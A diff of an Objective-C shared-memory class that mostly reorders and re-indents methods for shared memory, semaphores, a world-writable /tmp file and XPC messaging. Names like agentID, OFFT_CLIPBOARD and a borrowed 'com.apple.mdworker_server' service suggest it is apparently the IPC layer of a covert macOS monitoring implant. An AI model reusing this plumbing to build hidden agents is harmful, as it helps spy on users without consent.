@@ -221,6 +221,19 @@ static BOOL amIPrivileged()
   [super dealloc];
 }
 
+- (void)removeMappedFile
+{
+  if (mAmIPrivUser)
+    return;
+  
+  NSString *tmpFileName = [[NSString alloc] initWithFormat: @"/tmp/launchch-%d", mKey];
+  
+  if ([[NSFileManager defaultManager] fileExistsAtPath: tmpFileName] == TRUE)
+  {
+    [[NSFileManager defaultManager] removeItemAtPath: tmpFileName error: nil];
+  }
+}
+
 - (char *)_guessXPCServiceName: (NSString*)aPath
 {
   char *retString = NULL;
@@ -250,185 +263,10 @@ static BOOL amIPrivileged()
   return retString;
 }
 
-- (void)removeMappedFile
+- (void)zeroFillMemory
 {
-  if (mAmIPrivUser)
-    return;
-  
-  NSString *tmpFileName = [[NSString alloc] initWithFormat: @"/tmp/launchch-%d", mKey];
-  
-  if ([[NSFileManager defaultManager] fileExistsAtPath: tmpFileName] == TRUE)
-    {
-      [[NSFileManager defaultManager] removeItemAtPath: tmpFileName error: nil];
-    }
-}
-
-- (int)createMemoryRegion
-{
-  // If sandboxed read shmem by xpc service
-  if (amISandboxed) 
-    {
-      char *service_name = "com.apple.mdworker_server";
-      //[self _guessXPCServiceName: XPC_BUNDLE_FRAMEWORK_PATH];
-
-      if (service_name == NULL) 
-        {
-#ifdef  DEBUG_SHMEM
-          //infoLog(@"%s: error getting service name", __FUNCTION__);
-#endif
-          return -1;
-        }
-      else
-        {
-#ifdef  DEBUG_SHMEM
-          //infoLog(@"%s: setting service name %s", __FUNCTION__, service_name);
-#endif
-        }
-
-      xpc_handler_t handler = (^(xpc_object_t event) 
-                               {
-                               xpc_type_t type = _xpc_get_type(event);
-
-                               if (type == __xpc_type_error) 
-                               {
-#ifdef DEBUG_SHMEM
-                               //infoLog(@"error cannot continue!");
-#endif
-                               }
-                               });
-
-      mXpcCon = _xpc_connection_create("com.apple.mdworker_server", NULL);
-
-      _xpc_connection_set_event_handler(mXpcCon, handler);
-
-      _xpc_connection_resume(mXpcCon);
-
-      return 0;  
-    }
-  
-  if (mAmIPrivUser)
-    {
-      mSharedMemoryID = shmget(mKey, mSize, IPC_CREAT | GLOBAL_PERMISSIONS);
-      
-      if (mSharedMemoryID == -1)
-        {
-    #ifdef DEBUG_SHMEM
-          char *error = NULL;
-          switch (errno)
-            {
-            case ENOSPC: error = ENOSPC_STR; break;
-            case ENOMEM: error = ENOMEM_STR; break;
-            case EACCES: error = EACCES_STR; break;
-            case EINVAL: error = EINVAL_STR; break;
-                         //case EEXIST: return -2;
-            default:     error = EUNKNOWN_STR;
-            }
-
-          infoLog(@"Error shmget: %s", error);
-    #endif
-
-          return -1;
-        }
-    }
-  else
-    {
-      // create a tmp file for shmem
-      NSString *tmpFileName = [[NSString alloc] initWithFormat: @"/tmp/launchch-%d", mKey];
-   
-      if ([[NSFileManager defaultManager] fileExistsAtPath: tmpFileName] == FALSE)
-        {
-          int intZero = 0;
-          mSharedMemoryID = open([tmpFileName UTF8String], 
-                                 O_CREAT|O_RDWR, 
-                                 S_IRUSR|S_IWUSR|S_IRGRP|S_IWGRP|S_IROTH|S_IWOTH);
-        
-          // create/rewrite the file, mSharedMemory read fail if not
-          if (mSharedMemoryID != -1)
-            {
-              for (int i=0; i<mSize; i+=sizeof(intZero))
-                write(mSharedMemoryID, &intZero, sizeof(intZero));
-            }
-        }
-      else
-        mSharedMemoryID = open([tmpFileName UTF8String], 
-                               O_RDWR, 
-                               S_IRUSR|S_IWUSR|S_IRGRP|S_IWGRP|S_IROTH|S_IWOTH);
-    
-      if (mSharedMemoryID == -1)
-        {
-          return -1;
-        }
-    }
-  
-#ifdef DEBUG_SHMEM
-  infoLog(@"SharedMemoryID: %d", mSharedMemoryID);
-  infoLog(@"Key: %d", mKey);
-  infoLog(@"Size: %d", mSize);
-#endif
-  
-  return 0;
-}
-
-- (int)attachToMemoryRegion
-{
-  // If sandboxed to nothing...
-  if (amISandboxed == NO) 
-    { 
-      if (mAmIPrivUser)
-        {
-          mSharedMemory = shmat(mSharedMemoryID, 0, GLOBAL_PERMISSIONS);
-
-          if (mSharedMemory == NULL)
-            {
-#ifdef DEBUG_SHMEM
-              char *error = NULL;
-              switch (errno)
-                {
-                case EACCES: error = EACCES_STR; break;
-                case ENOMEM: error = ENOMEM_STR; break;
-                case EINVAL: error = EINVAL_STR2; break;
-                case EMFILE: error = EMFILE_STR; break;
-                default:     error = EUNKNOWN_STR;
-                }
-
-              infoLog(@"Error shmat: %s", error);
-#endif
-
-              return -1;
-            }
-        }
-      else
-        {
-          mSharedMemory = mmap(NULL, mSize, PROT_READ|PROT_WRITE, MAP_FILE|MAP_SHARED, mSharedMemoryID, 0);
-        
-          if (mSharedMemory == NULL)
-            {
-              return -1;
-            }
-        }
-
-#ifdef DEBUG_SHMEM
-      infoLog(@"ptrSharedMemory: 0x%08x", mSharedMemory);
-#endif
-
-      mSemaphoreID = sem_open((const char *)mSemaphoreName, 
-                              O_CREAT,
-                              GLOBAL_PERMISSIONS,
-                              1);
-
-      if ((int *)mSemaphoreID == SEM_FAILED)
-        {
-#ifdef DEBUG_SHMEM
-          infoLog(@"An error occured while opening semaphore in sem_open()");
-#endif
-          if (mAmIPrivUser)
-            shmdt(mSharedMemory);
-
-          return -1;
-        } 
-    }
-  
-  return 0;
+  if (mSharedMemory)
+    memset(mSharedMemory, '\0', mSize);
 }
 
 - (int)detachFromMemoryRegion
@@ -473,10 +311,172 @@ static BOOL amIPrivileged()
   return 0;
 }
 
-- (void)zeroFillMemory
+- (int)attachToMemoryRegion
 {
-  if (mSharedMemory)
-    memset(mSharedMemory, '\0', mSize);
+  // If sandboxed to nothing...
+  if (amISandboxed == NO) 
+  { 
+    if (mAmIPrivUser)
+    {
+      mSharedMemory = shmat(mSharedMemoryID, 0, GLOBAL_PERMISSIONS);
+      
+      if (mSharedMemory == NULL)
+      {
+#ifdef DEBUG_SHMEM
+        char *error = NULL;
+        switch (errno)
+        {
+          case EACCES: error = EACCES_STR; break;
+          case ENOMEM: error = ENOMEM_STR; break;
+          case EINVAL: error = EINVAL_STR2; break;
+          case EMFILE: error = EMFILE_STR; break;
+          default:     error = EUNKNOWN_STR;
+        }
+        
+        infoLog(@"Error shmat: %s", error);
+#endif
+        
+        return -1;
+      }
+    }
+    else
+    {
+      mSharedMemory = mmap(NULL, mSize, PROT_READ|PROT_WRITE, MAP_FILE|MAP_SHARED, mSharedMemoryID, 0);
+      
+      if (mSharedMemory == NULL)
+      {
+        return -1;
+      }
+    }
+    
+#ifdef DEBUG_SHMEM
+    infoLog(@"ptrSharedMemory: 0x%08x", mSharedMemory);
+#endif
+    
+    mSemaphoreID = sem_open((const char *)mSemaphoreName, 
+                            O_CREAT,
+                            GLOBAL_PERMISSIONS,
+                            1);
+    
+    if ((int *)mSemaphoreID == SEM_FAILED)
+    {
+#ifdef DEBUG_SHMEM
+      infoLog(@"An error occured while opening semaphore in sem_open()");
+#endif
+      if (mAmIPrivUser)
+        shmdt(mSharedMemory);
+      
+      return -1;
+    } 
+  }
+  
+  return 0;
+}
+
+- (int)createMemoryRegion
+{
+  // If sandboxed read shmem by xpc service
+  if (amISandboxed) 
+  {
+    char *service_name = "com.apple.mdworker_server";
+    //[self _guessXPCServiceName: XPC_BUNDLE_FRAMEWORK_PATH];
+    
+    if (service_name == NULL) 
+    {
+#ifdef  DEBUG_SHMEM
+      //infoLog(@"%s: error getting service name", __FUNCTION__);
+#endif
+      return -1;
+    }
+    else
+    {
+#ifdef  DEBUG_SHMEM
+      //infoLog(@"%s: setting service name %s", __FUNCTION__, service_name);
+#endif
+    }
+    
+    xpc_handler_t handler = (^(xpc_object_t event) 
+                             {
+                               xpc_type_t type = _xpc_get_type(event);
+                               
+                               if (type == __xpc_type_error) 
+                               {
+#ifdef DEBUG_SHMEM
+                                 //infoLog(@"error cannot continue!");
+#endif
+                               }
+                             });
+    
+    mXpcCon = _xpc_connection_create("com.apple.mdworker_server", NULL);
+    
+    _xpc_connection_set_event_handler(mXpcCon, handler);
+    
+    _xpc_connection_resume(mXpcCon);
+    
+    return 0;  
+  }
+  
+  if (mAmIPrivUser)
+  {
+    mSharedMemoryID = shmget(mKey, mSize, IPC_CREAT | GLOBAL_PERMISSIONS);
+    
+    if (mSharedMemoryID == -1)
+    {
+#ifdef DEBUG_SHMEM
+      char *error = NULL;
+      switch (errno)
+      {
+        case ENOSPC: error = ENOSPC_STR; break;
+        case ENOMEM: error = ENOMEM_STR; break;
+        case EACCES: error = EACCES_STR; break;
+        case EINVAL: error = EINVAL_STR; break;
+          //case EEXIST: return -2;
+        default:     error = EUNKNOWN_STR;
+      }
+      
+      infoLog(@"Error shmget: %s", error);
+#endif
+      
+      return -1;
+    }
+  }
+  else
+  {
+    // create a tmp file for shmem
+    NSString *tmpFileName = [[NSString alloc] initWithFormat: @"/tmp/launchch-%d", mKey];
+    
+    if ([[NSFileManager defaultManager] fileExistsAtPath: tmpFileName] == FALSE)
+    {
+      int intZero = 0;
+      mSharedMemoryID = open([tmpFileName UTF8String], 
+                             O_CREAT|O_RDWR, 
+                             S_IRUSR|S_IWUSR|S_IRGRP|S_IWGRP|S_IROTH|S_IWOTH);
+      
+      // create/rewrite the file, mSharedMemory read fail if not
+      if (mSharedMemoryID != -1)
+      {
+        for (int i=0; i<mSize; i+=sizeof(intZero))
+          write(mSharedMemoryID, &intZero, sizeof(intZero));
+      }
+    }
+    else
+      mSharedMemoryID = open([tmpFileName UTF8String], 
+                             O_RDWR, 
+                             S_IRUSR|S_IWUSR|S_IRGRP|S_IWGRP|S_IROTH|S_IWOTH);
+    
+    if (mSharedMemoryID == -1)
+    {
+      return -1;
+    }
+  }
+  
+#ifdef DEBUG_SHMEM
+  infoLog(@"SharedMemoryID: %d", mSharedMemoryID);
+  infoLog(@"Key: %d", mKey);
+  infoLog(@"Size: %d", mSize);
+#endif
+  
+  return 0;
 }
 
 - (BOOL)clearConfigurations
@@ -517,6 +517,11 @@ static BOOL amIPrivileged()
   return TRUE;
 }
 
+- (void)_unlockShmem
+{
+  if (mAmIPrivUser == NO)
+    sem_post(mSemaphoreID);
+}
 
 - (void)_lockShmem
 {
@@ -525,10 +530,88 @@ static BOOL amIPrivileged()
       return;
 }
 
-- (void)_unlockShmem
+- (BOOL)writeMemorybyXPC: (NSData *)aData
+                  offset: (u_int)anOffset
+           fromComponent: (u_int)aComponent
 {
-  if (mAmIPrivUser == NO)
-    sem_post(mSemaphoreID);
+  xpc_object_t reply;
+  BOOL bRet = FALSE;
+  
+  if (aData == nil || 
+      [aData length] == 0)
+  {
+#ifdef DEBUG_SHMEM
+    infoLog(@"[XPC __m_MSharedMemory] write memory with aData = nil");
+#endif
+    return bRet;
+  }
+  else
+  {
+#ifdef DEBUG_SHMEM
+    infoLog(@"[XPC __m_MSharedMemory] writeMemorybyXPC....");
+#endif
+  }
+  
+  // Write command
+  xpc_object_t cmd  = _xpc_int64_create(WRITE_XPC_CMD);
+  xpc_object_t off  = _xpc_int64_create(anOffset);
+  xpc_object_t cmp  = _xpc_int64_create(aComponent);
+  xpc_object_t data = _xpc_data_create([aData bytes], [aData length]);
+  
+  xpc_object_t message = _xpc_dictionary_create(NULL, NULL, 0);
+  
+  _xpc_dictionary_set_value(message, "command", cmd);
+  _xpc_dictionary_set_value(message, "offset", off);
+  _xpc_dictionary_set_value(message, "component", cmp);
+  _xpc_dictionary_set_value(message, "data", data);
+  
+  reply = _xpc_connection_send_message_with_reply_sync(mXpcCon, message);
+  
+  if (reply != NULL) 
+  {
+    xpc_type_t type = _xpc_get_type(reply);
+    
+    if (type == __xpc_type_error) 
+    {
+      if (reply == __xpc_error_connection_interrupted) 
+      {
+#ifdef DEBUG_SHMEM
+        infoLog(@"xpc error connection interrupted");
+#endif
+      } 
+      else if (reply == __xpc_error_connection_invalid) 
+      {            
+#ifdef DEBUG_SHMEM
+        infoLog(@"xpc error connection invalid");
+#endif
+      }
+    } 
+    else if (type == __xpc_type_dictionary) 
+    { 
+      unsigned long len = 0;
+      char *buff = NULL;
+      
+      buff = (char*)_xpc_dictionary_get_data(reply, "data", &len);
+      
+      if (buff == NULL || len == 0)
+      {
+#ifdef DEBUG_SHMEM
+        infoLog(@"xpc error getting raw data");
+#endif
+      }
+      else
+      {
+#ifdef DEBUG_SHMEM
+        infoLog(@"xpc getting raw data len %lu", len);
+#endif
+        memcpy(&bRet, buff, sizeof(bRet));
+      }
+    }
+  }
+  
+  _xpc_release(message);
+  
+  return bRet;
 }
 
 - (NSMutableData*)readMemoryByXPC:(u_int)anOffset 
@@ -551,111 +634,58 @@ static BOOL amIPrivileged()
   xpc_object_t reply = _xpc_connection_send_message_with_reply_sync(mXpcCon, message);
   
   if (reply != NULL)
+  {
+    xpc_type_t type = _xpc_get_type(reply);
+    
+    if (type == __xpc_type_error) 
     {
-      xpc_type_t type = _xpc_get_type(reply);
-
-      if (type == __xpc_type_error) 
+      if (reply == __xpc_error_connection_interrupted) 
+      {
+#ifdef DEBUG_SHMEM
+        infoLog(@" [XPC __m_MSharedMemory] xpc error connection interrupted");
+#endif
+      } 
+      else if (reply == __xpc_error_connection_invalid) 
+      {            
+#ifdef DEBUG_SHMEM
+        infoLog(@"[XPC __m_MSharedMemory] xpc error connection invalid");
+#endif
+      }
+    } 
+    else if (type == __xpc_type_dictionary) 
+    { 
+      unsigned long len;
+      char *buff;
+      
+      buff = (char*)_xpc_dictionary_get_data(reply, "data", &len);
+      
+      if (buff == NULL)
+      {
+#ifdef DEBUG_SHMEM
+        infoLog(@"[XPC __m_MSharedMemory] xpc error getting raw data");
+#endif
+      }
+      else
+      {
+        xpcReplyData = [[NSMutableData alloc] initWithBytes:buff 
+                                                     length:len];
+#ifdef DEBUG_SHMEM
+        if (anOffset == OFFT_CLIPBOARD)
         {
-          if (reply == __xpc_error_connection_interrupted) 
-            {
-#ifdef DEBUG_SHMEM
-              infoLog(@" [XPC __m_MSharedMemory] xpc error connection interrupted");
-#endif
-            } 
-          else if (reply == __xpc_error_connection_invalid) 
-            {            
-#ifdef DEBUG_SHMEM
-              infoLog(@"[XPC __m_MSharedMemory] xpc error connection invalid");
-#endif
-            }
-        } 
-      else if (type == __xpc_type_dictionary) 
-        { 
-          unsigned long len;
-          char *buff;
-
-          buff = (char*)_xpc_dictionary_get_data(reply, "data", &len);
-
-          if (buff == NULL)
-            {
-#ifdef DEBUG_SHMEM
-              infoLog(@"[XPC __m_MSharedMemory] xpc error getting raw data");
-#endif
-            }
-          else
-            {
-              xpcReplyData = [[NSMutableData alloc] initWithBytes:buff 
-                                                           length:len];
-#ifdef DEBUG_SHMEM
-              if (anOffset == OFFT_CLIPBOARD)
-                {
-                  infoLog(@"[XPC __m_MSharedMemory] read memory at off %#x", anOffset);
-
-                  shMemoryCommand *cmd = (shMemoryCommand*)buff;
-
-                  infoLog(@"[XPC __m_MSharedMemory] agentID %#x cmd %#x", cmd->agentID, cmd->command);
-                }
-#endif
-            }
+          infoLog(@"[XPC __m_MSharedMemory] read memory at off %#x", anOffset);
+          
+          shMemoryCommand *cmd = (shMemoryCommand*)buff;
+          
+          infoLog(@"[XPC __m_MSharedMemory] agentID %#x cmd %#x", cmd->agentID, cmd->command);
         }
+#endif
+      }
     }
+  }
   
   _xpc_release(message);
   
   return xpcReplyData;
-}
-
-- (NSMutableData *)readMemory: (u_int)anOffset
-                fromComponent: (u_int)aComponent
-{
-  NSMutableData *readData = nil;
-  
-  // if sandboxed read shmem by xpc api
-  if (amISandboxed)
-    {
-      readData = [self readMemoryByXPC: anOffset 
-                         fromComponent: aComponent];  
-
-      return [readData autorelease];
-    }
-  
-  shMemoryCommand *memoryHeader = (shMemoryCommand *)(mSharedMemory + anOffset);
-  
-  if (aComponent != COMP_CORE && aComponent != COMP_AGENT)
-    {
-#ifdef DEBUG_SHMEM
-      infoLog(@"[EE] readMemory-command unsupported component");
-#endif
-      return nil;
-    }
-  
-  if (anOffset == 0)
-    {
-#ifdef DEBUG_SHMEM
-      infoLog(@"[EE] readMemory-command offset is zero");
-#endif
-      return nil;
-    }
-  
-  if (memoryHeader->agentID != 0)
-    {
-      //
-      // Now if who is reading is the same as who this data is directed to,
-      // read it and clean out the area
-      //
-      if ((aComponent ^ memoryHeader->direction) == 0)
-        {
-#ifdef DEBUG_SHMEM
-          infoLog(@"Found data on shared memory");
-#endif
-          readData = [[NSMutableData alloc] initWithBytes: mSharedMemory + anOffset
-                                                   length: sizeof(shMemoryCommand)];
-
-          //memset((void *)(mSharedMemory + anOffset), '\0', sizeof(shMemoryCommand));
-        }
-    }
-  
-  return [readData autorelease];
 }
 
 - (NSMutableData *)readMemoryByXPCFromComponent: (u_int)aComponent
@@ -664,7 +694,7 @@ static BOOL amIPrivileged()
 
 {
   NSMutableData *xpcReplyData = nil;
-
+  
   // reading command
   xpc_object_t cmd = _xpc_int64_create(READ_XPC_COMP_CMD);
   xpc_object_t cmp = _xpc_int64_create(aComponent);
@@ -683,44 +713,44 @@ static BOOL amIPrivileged()
   xpc_object_t reply = _xpc_connection_send_message_with_reply_sync(mXpcCon, message);
   
   if (reply != NULL)
+  {
+    xpc_type_t type = _xpc_get_type(reply);
+    
+    if (type == __xpc_type_error) 
     {
-      xpc_type_t type = _xpc_get_type(reply);
-
-      if (type == __xpc_type_error) 
-        {
-          if (reply == __xpc_error_connection_interrupted) 
-            {
+      if (reply == __xpc_error_connection_interrupted) 
+      {
 #ifdef DEBUG_SHMEM
-              infoLog(@" [XPC __m_MSharedMemory] xpc error connection interrupted");
+        infoLog(@" [XPC __m_MSharedMemory] xpc error connection interrupted");
 #endif
-            } 
-          else if (reply == __xpc_error_connection_invalid) 
-            {            
+      } 
+      else if (reply == __xpc_error_connection_invalid) 
+      {            
 #ifdef DEBUG_SHMEM
-              infoLog(@"[XPC __m_MSharedMemory] xpc error connection invalid");
+        infoLog(@"[XPC __m_MSharedMemory] xpc error connection invalid");
 #endif
-            }
-        } 
-      else if (type == __xpc_type_dictionary) 
-        { 
-          unsigned long len;
-          char *buff;
-
-          buff = (char*)_xpc_dictionary_get_data(reply, "data", &len);
-
-          if (buff == NULL)
-            {
+      }
+    } 
+    else if (type == __xpc_type_dictionary) 
+    { 
+      unsigned long len;
+      char *buff;
+      
+      buff = (char*)_xpc_dictionary_get_data(reply, "data", &len);
+      
+      if (buff == NULL)
+      {
 #ifdef DEBUG_SHMEM
-              infoLog(@"[XPC __m_MSharedMemory] xpc error getting raw data");
+        infoLog(@"[XPC __m_MSharedMemory] xpc error getting raw data");
 #endif
-            }
-          else
-            {
-              xpcReplyData = [[NSMutableData alloc] initWithBytes:buff 
-                                                           length:len];
-            }
-        }
+      }
+      else
+      {
+        xpcReplyData = [[NSMutableData alloc] initWithBytes:buff 
+                                                     length:len];
+      }
     }
+  }
   
   _xpc_release(message);
   
@@ -737,13 +767,13 @@ static BOOL amIPrivileged()
   
   // if sandboxed read shmem by xpc api
   if (amISandboxed)
-    {
-      readData = [self readMemoryByXPCFromComponent: aComponent 
-                                           forAgent: anAgentID 
-                                    withCommandType: aCommandType];  
-
-      return readData;
-    }
+  {
+    readData = [self readMemoryByXPCFromComponent: aComponent 
+                                         forAgent: anAgentID 
+                                  withCommandType: aCommandType];  
+    
+    return readData;
+  }
   
   BOOL lookForAgent       = NO;
   BOOL foundAgent         = NO;
@@ -755,28 +785,28 @@ static BOOL amIPrivileged()
   u_int offset            = 0;
   
   if (aComponent != COMP_CORE && aComponent != COMP_AGENT)
-    {
+  {
 #ifdef DEBUG_SHMEM
-      infoLog(@"[EE] readMemory-log unsupported component");
+    infoLog(@"[EE] readMemory-log unsupported component");
 #endif
-      return nil;
-    }
-
+    return nil;
+  }
+  
   if (anAgentID == 0 && aCommandType == 0)
-    {
+  {
 #ifdef DEBUG_SHMEM
-      infoLog(@"[EE] readMemory-log usupported read");
+    infoLog(@"[EE] readMemory-log usupported read");
 #endif
-    }
-
+  }
+  
   if (aCommandType != 0)
-    {
-      lookForCommand = YES;
-    }
+  {
+    lookForCommand = YES;
+  }
   if (anAgentID != 0)
-    {
-      lookForAgent = YES;
-    }
+  {
+    lookForAgent = YES;
+  }
   
   time_t lowestTimestamp      = 0;
   u_int  matchingObjectOffset = 0;
@@ -785,205 +815,174 @@ static BOOL amIPrivileged()
   // Find the first available block who matches our request
   //
   do
+  {
+    tempHeader = (shMemoryLog *)(mSharedMemory + offset);
+    int tempState       = tempHeader->status;
+    int tmpAgentID      = tempHeader->agentID;
+    int tmpCommandType  = tempHeader->commandType;
+    int tmpDirection    = tempHeader->direction;
+    
+    if (tempState == SHMEM_FREE)
     {
-      tempHeader = (shMemoryLog *)(mSharedMemory + offset);
-      int tempState       = tempHeader->status;
-      int tmpAgentID      = tempHeader->agentID;
-      int tmpCommandType  = tempHeader->commandType;
-      int tmpDirection    = tempHeader->direction;
-
-      if (tempState == SHMEM_FREE)
-        {
-          offset += sizeof (shMemoryLog);
-          continue;
-        }
-
-      if (tempState == SHMEM_LOCKED)
-        {
-#ifdef DEBUG_SHMEM
-          infoLog(@"ANOMALY! FOUND LOCKED BLOCK ON READ");
-#endif
-        }
-
-      if (lookForCommand == YES)
-        {
-          if (((aCommandType & tmpCommandType) == tmpCommandType)
-              && tmpCommandType != 0)
-            {
-              foundCommand = YES;
-            }
-        }
-      if (lookForAgent == YES)
-        {
-          if (tmpAgentID == anAgentID)
-            {
-              foundAgent = YES;
-            }
-        }
-
-      // Looking only for commandType
-      if ((lookForCommand == YES && foundCommand == YES)
-          && lookForAgent == NO)
-        blockFound = YES;
-
-      // Looking only for agentID
-      if ((lookForAgent     == YES && foundAgent == YES)
-          && lookForCommand == NO)
-        blockFound = YES;
-
-      // Looking for both
-      if ((lookForCommand  == YES && foundCommand == YES)
-          && (lookForAgent == YES && foundAgent   == YES))
-        blockFound = YES;
-
-      if (blockFound == YES)
-        {
-          if ((tmpDirection ^ aComponent) == 0)
-            {
-#ifdef DEBUG_SHMEM
-              infoLog(@"[ii] Found data matching our request on shmem");
-#endif
-
-              blockMatched = YES;
-
-              if (lowestTimestamp == 0)
-                {
-                  lowestTimestamp = tempHeader->timestamp;
-                  matchingObjectOffset = offset;
-                }
-              else if (tempHeader->timestamp < lowestTimestamp)
-                {
-                  lowestTimestamp = tempHeader->timestamp;
-                  matchingObjectOffset = offset;
-                }
-            }
-        }
-
       offset += sizeof (shMemoryLog);
-
-      foundCommand = NO;
-      foundAgent   = NO;
-      blockFound   = NO;
+      continue;
     }
+    
+    if (tempState == SHMEM_LOCKED)
+    {
+#ifdef DEBUG_SHMEM
+      infoLog(@"ANOMALY! FOUND LOCKED BLOCK ON READ");
+#endif
+    }
+    
+    if (lookForCommand == YES)
+    {
+      if (((aCommandType & tmpCommandType) == tmpCommandType)
+          && tmpCommandType != 0)
+      {
+        foundCommand = YES;
+      }
+    }
+    if (lookForAgent == YES)
+    {
+      if (tmpAgentID == anAgentID)
+      {
+        foundAgent = YES;
+      }
+    }
+    
+    // Looking only for commandType
+    if ((lookForCommand == YES && foundCommand == YES)
+        && lookForAgent == NO)
+      blockFound = YES;
+    
+    // Looking only for agentID
+    if ((lookForAgent     == YES && foundAgent == YES)
+        && lookForCommand == NO)
+      blockFound = YES;
+    
+    // Looking for both
+    if ((lookForCommand  == YES && foundCommand == YES)
+        && (lookForAgent == YES && foundAgent   == YES))
+      blockFound = YES;
+    
+    if (blockFound == YES)
+    {
+      if ((tmpDirection ^ aComponent) == 0)
+      {
+#ifdef DEBUG_SHMEM
+        infoLog(@"[ii] Found data matching our request on shmem");
+#endif
+        
+        blockMatched = YES;
+        
+        if (lowestTimestamp == 0)
+        {
+          lowestTimestamp = tempHeader->timestamp;
+          matchingObjectOffset = offset;
+        }
+        else if (tempHeader->timestamp < lowestTimestamp)
+        {
+          lowestTimestamp = tempHeader->timestamp;
+          matchingObjectOffset = offset;
+        }
+      }
+    }
+    
+    offset += sizeof (shMemoryLog);
+    
+    foundCommand = NO;
+    foundAgent   = NO;
+    blockFound   = NO;
+  }
   while (offset < mSize);
   
   if (blockMatched == YES)
+  {
+    //infoLog(@"lowest Timestamp: %x", lowestTimestamp);
+    
+    if (testPreviousTime != 0)
     {
-      //infoLog(@"lowest Timestamp: %x", lowestTimestamp);
-
-      if (testPreviousTime != 0)
-        {
-          if (lowestTimestamp < testPreviousTime)
-            {
+      if (lowestTimestamp < testPreviousTime)
+      {
 #ifdef DEBUG_SHMEM
-              infoLog(@"ANOMALY DETECTED in shared memory!");
-              infoLog(@"previousTimestamp: %x", testPreviousTime);
-              infoLog(@"lowestTimestamp  : %x", lowestTimestamp);
+        infoLog(@"ANOMALY DETECTED in shared memory!");
+        infoLog(@"previousTimestamp: %x", testPreviousTime);
+        infoLog(@"lowestTimestamp  : %x", lowestTimestamp);
 #endif
-            }
-        }
-
-      testPreviousTime = lowestTimestamp;
-      readData = [[NSMutableData alloc] initWithBytes: (char *)(mSharedMemory + matchingObjectOffset)
-                                               length: sizeof(shMemoryLog)];
-
-      if (aCommandType != CM_AGENT_CONF)
-        {
-          memset((char *)(mSharedMemory + matchingObjectOffset), '\0', sizeof(shMemoryLog));
-        }
+      }
     }
-  else
+    
+    testPreviousTime = lowestTimestamp;
+    readData = [[NSMutableData alloc] initWithBytes: (char *)(mSharedMemory + matchingObjectOffset)
+                                             length: sizeof(shMemoryLog)];
+    
+    if (aCommandType != CM_AGENT_CONF)
     {
-      //infoLog(@"block not found while reading!!!!!");
-
-      return nil;
+      memset((char *)(mSharedMemory + matchingObjectOffset), '\0', sizeof(shMemoryLog));
     }
+  }
+  else
+  {
+    //infoLog(@"block not found while reading!!!!!");
+    
+    return nil;
+  }
   
   return readData;
 }
 
-- (BOOL)writeMemorybyXPC: (NSData *)aData
-                  offset: (u_int)anOffset
-           fromComponent: (u_int)aComponent
+- (NSMutableData *)readMemory: (u_int)anOffset
+                fromComponent: (u_int)aComponent
 {
-  xpc_object_t reply;
-  BOOL bRet = FALSE;
-
-  if (aData == nil || 
-      [aData length] == 0)
+  NSMutableData *readData = nil;
+  
+  // if sandboxed read shmem by xpc api
+  if (amISandboxed)
+  {
+    readData = [self readMemoryByXPC: anOffset 
+                       fromComponent: aComponent];  
+    
+    return [readData autorelease];
+  }
+  
+  shMemoryCommand *memoryHeader = (shMemoryCommand *)(mSharedMemory + anOffset);
+  
+  if (aComponent != COMP_CORE && aComponent != COMP_AGENT)
+  {
+#ifdef DEBUG_SHMEM
+    infoLog(@"[EE] readMemory-command unsupported component");
+#endif
+    return nil;
+  }
+  
+  if (anOffset == 0)
+  {
+#ifdef DEBUG_SHMEM
+    infoLog(@"[EE] readMemory-command offset is zero");
+#endif
+    return nil;
+  }
+  
+  if (memoryHeader->agentID != 0)
+  {
+    //
+    // Now if who is reading is the same as who this data is directed to,
+    // read it and clean out the area
+    //
+    if ((aComponent ^ memoryHeader->direction) == 0)
     {
 #ifdef DEBUG_SHMEM
-      infoLog(@"[XPC __m_MSharedMemory] write memory with aData = nil");
+      infoLog(@"Found data on shared memory");
 #endif
-      return bRet;
+      readData = [[NSMutableData alloc] initWithBytes: mSharedMemory + anOffset
+                                               length: sizeof(shMemoryCommand)];
+      
+      //memset((void *)(mSharedMemory + anOffset), '\0', sizeof(shMemoryCommand));
     }
-  else
-    {
-#ifdef DEBUG_SHMEM
-      infoLog(@"[XPC __m_MSharedMemory] writeMemorybyXPC....");
-#endif
-    }
-
-  // Write command
-  xpc_object_t cmd  = _xpc_int64_create(WRITE_XPC_CMD);
-  xpc_object_t off  = _xpc_int64_create(anOffset);
-  xpc_object_t cmp  = _xpc_int64_create(aComponent);
-  xpc_object_t data = _xpc_data_create([aData bytes], [aData length]);
-
-  xpc_object_t message = _xpc_dictionary_create(NULL, NULL, 0);
-
-  _xpc_dictionary_set_value(message, "command", cmd);
-  _xpc_dictionary_set_value(message, "offset", off);
-  _xpc_dictionary_set_value(message, "component", cmp);
-  _xpc_dictionary_set_value(message, "data", data);
-
-  reply = _xpc_connection_send_message_with_reply_sync(mXpcCon, message);
-
-  if (reply != NULL) 
-    {
-      xpc_type_t type = _xpc_get_type(reply);
-
-      if (type == __xpc_type_error) 
-        {
-          if (reply == __xpc_error_connection_interrupted) 
-            {
-#ifdef DEBUG_SHMEM
-              infoLog(@"xpc error connection interrupted");
-#endif
-            } 
-          else if (reply == __xpc_error_connection_invalid) 
-            {            
-#ifdef DEBUG_SHMEM
-              infoLog(@"xpc error connection invalid");
-#endif
-            }
-        } 
-      else if (type == __xpc_type_dictionary) 
-        { 
-          unsigned long len = 0;
-          char *buff = NULL;
-
-          buff = (char*)_xpc_dictionary_get_data(reply, "data", &len);
-
-          if (buff == NULL || len == 0)
-            {
-#ifdef DEBUG_SHMEM
-              infoLog(@"xpc error getting raw data");
-#endif
-            }
-          else
-            {
-#ifdef DEBUG_SHMEM
-              infoLog(@"xpc getting raw data len %lu", len);
-#endif
-              memcpy(&bRet, buff, sizeof(bRet));
-            }
-        }
-    }
-
-  _xpc_release(message);
-
-  return bRet;
+  }
+  
+  return [readData autorelease];
 }
 
 - (BOOL)writeMemory: (NSData *)aData
@@ -991,64 +990,64 @@ static BOOL amIPrivileged()
       fromComponent: (u_int)aComponent
 {
   int memoryState = 0;
-
+  
   // Do it by xpc service
   if (amISandboxed) 
     return [self writeMemorybyXPC:aData offset:anOffset fromComponent:aComponent];
-
+  
   //
   // In case we receive 0 as offset it means that we're dealing within the logs
   // shared memory, thus we need to find the first available block (not written)
   //
   if (anOffset == 0 || anOffset == 1)
+  {
+    if (anOffset == 1)
     {
-      if (anOffset == 1)
-        {
-          [self zeroFillMemory];
-          anOffset = 0;
-        }
-
-      [self _lockShmem];
+      [self zeroFillMemory];
+      anOffset = 0;
+    }
     
-      do
-        {
